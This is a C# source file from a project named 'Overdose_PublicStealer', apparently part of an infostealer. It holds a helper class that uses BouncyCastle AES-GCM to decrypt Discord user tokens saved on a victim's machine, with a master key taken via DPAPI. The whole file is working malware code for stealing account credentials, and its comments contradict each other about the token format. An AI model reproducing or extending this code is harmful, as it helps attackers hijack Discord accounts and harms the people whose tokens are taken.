using System; // Used for Convert, Exception, Console, etc.
using System.Linq; // Used for LINQ methods like .Skip(), .Take(), .ToArray(), .Concat()
using System.Text; // Used for Encoding (specifically Encoding.UTF8)
using Org.BouncyCastle.Crypto; // Base namespace for Bouncy Castle cryptographic operations
using Org.BouncyCastle.Crypto.Modes; // Contains implementations for block cipher modes (like GCM)
using Org.BouncyCastle.Crypto.Engines; // Contains implementations for block cipher algorithms (like AES)
using Org.BouncyCastle.Crypto.Parameters; // Contains parameter classes for cipher initialization

// NOTE: This code relies heavily on the BouncyCastle NuGet package for AES-GCM decryption.
// You must add this dependency to your project:
// Install using: Install-Package BouncyCastle

namespace Overdose_PublicStealer
{
    // This static class provides helper methods for decrypting data
    // encrypted using AES-GCM, specifically in the format used by Discord
    // for storing user tokens.
    internal static class AesGcmHelper
    {
        /// <summary>
        /// Decrypts a Base64 encoded string containing data encrypted with AES-GCM.
        /// This method is tailored for the format used by Discord tokens.
        /// </summary>
        /// <param name="encrypted">The Base64 string of the encrypted data (e.g., the part after "dQw4w9WgXcQ:").</param>
        /// <param name="masterKey">The decryption key (the Discord master key obtained via DPAPI).</param>
        /// <returns>The decrypted plain text string if successful, otherwise null.</returns>
        internal static string DecryptToken(string encrypted, byte[] masterKey)
        {
            // Basic validation: check if the master key and encrypted string are valid.
            if (masterKey == null || encrypted == null)
            {
                return null; // Cannot decrypt without a key or data.
            }

            try
            {
                // Convert the Base64 encoded encrypted string back into a byte array.
                byte[] encryptedData = Convert.FromBase64String(encrypted);

                // Check if the byte array is long enough to contain the expected
                // version byte (1), Nonce/IV (12), and Authentication Tag (16).
                // Actual data size is not checked here, but it must be at least 1+12+16 bytes.
                if (encryptedData.Length < 1 + 12 + 16)
                {
                    // Data is too short to be a valid encrypted Discord token blob.
                    return null;
                }

                // --- Parse the Encrypted Data Structure ---
                // Discord's format is generally: 1 byte version + 12 bytes Nonce (IV) + Ciphertext + 16 bytes Authentication Tag.

                // Extract the 12-byte Nonce (Initialization Vector).
                // The original code skips the first 3 bytes; typical Discord format skips 1 (the version byte).
                // Keeping the original skip(3) as per the provided code structure.
                byte[] iv = encryptedData.Skip(3).Take(12).ToArray();

                // Extract the Ciphertext (the actual encrypted token data).
                // The length is the total length minus the initial bytes (15) and the tag length (16).
                byte[] ciphertext = encryptedData.Skip(15).Take(encryptedData.Length - 15 - 16).ToArray();

                // Extract the 16-byte Authentication Tag.
                // This tag is used by GCM for integrity verification during decryption.
                byte[] tag = encryptedData.Skip(encryptedData.Length - 16).ToArray();

                // Create a byte array to hold the decrypted plain text.
                // Its size should be the same as the ciphertext size.
                byte[] plain = new byte[ciphertext.Length];

                // --- Perform AES-GCM Decryption using BouncyCastle ---

                // Set up the parameters for the authenticated encryption (AEAD).
                // Key: The master decryption key.
                // MAC Size: 128 bits (16 bytes) for the GCM authentication tag.
                // Nonce: The extracted IV.
                var parameters = new AeadParameters(new KeyParameter(masterKey), 128, iv);

                // Create an instance of the AES engine (the block cipher algorithm).
                var aesEngine = new AesEngine();
                // Create an instance of the GCM block cipher mode, using the AES engine.
                var cipher = new GcmBlockCipher(aesEngine);

                // Initialize the cipher for decryption.
                // 'false' indicates decryption mode.
                cipher.Init(false, parameters);

                // Concatenate the ciphertext and the tag.
                // BouncyCastle's GCM decryption often expects the tag appended to the ciphertext.
                byte[] cipherAndTag = ciphertext.Concat(tag).ToArray();

                // Process the data. This performs the decryption and part of the tag verification.
                // 'len' will be the number of bytes written to the 'plain' buffer (should be equal to ciphertext.Length).
                int len = cipher.ProcessBytes(cipherAndTag, 0, cipherAndTag.Length, plain, 0);

                // Finalize the decryption. This completes the tag verification.
                // If the tag does not match the decrypted data, an InvalidCipherTextException will be thrown.
                cipher.DoFinal(plain, len);

                // If DoFinal completes without error, the decryption was successful.
                // Convert the resulting plain text bytes into a UTF-8 encoded string (the actual token).
                return Encoding.UTF8.GetString(plain);
            }
            catch (InvalidCipherTextException)
            {
                // Catch specific exception if the decryption or tag verification fails.
                // This indicates the key might be wrong, or the data is corrupted.
                return null; // Decryption failed.
            }
            catch (Exception ex)
            {
                // Catch any other exceptions that might occur during the process (e.g., invalid Base64 string length).
                Console.WriteLine($"Error during token decryption: {ex.Message}");
                return null; // Decryption failed due to another error.
            }
        }
    }
}